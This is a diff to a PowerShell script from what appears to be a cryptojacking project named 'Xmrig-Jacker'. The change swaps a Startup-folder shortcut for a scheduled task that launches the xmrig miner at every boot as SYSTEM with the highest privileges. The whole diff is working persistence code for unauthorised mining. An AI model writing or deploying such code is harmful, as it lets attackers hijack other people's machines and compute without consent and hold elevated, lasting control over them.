@@ -1,13 +1,15 @@
-$scriptPath = "C:\temp\Xmrig-Jacker-main\xmrig\xmrig.exe"
-$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\xmrig.lnk"
+$xmrigPath = "C:\temp\Xmrig-Jacker-main\xmrig\xmrig.exe"
 
-$shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = $scriptPath
-$shortcut.Save()
+# Create a scheduled task action to run xmrig.exe
+$action = New-ScheduledTaskAction -Execute $xmrigPath
 
-# Elevate the shortcut to run as administrator
-$shortcut.WindowStyle = 1
-$shortcut.Save()
+# Create a trigger for the task to run on system startup
+$trigger = New-ScheduledTaskTrigger -AtStartup
+
+# Create a principal for the task to run with the highest privileges
+$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel HighestAvailable
+
+# Register the scheduled task
+Register-ScheduledTask -TaskName "Run Xmrig" -Action $action -Trigger $trigger -Principal $principal -RunLevel Highest -Force
 
 
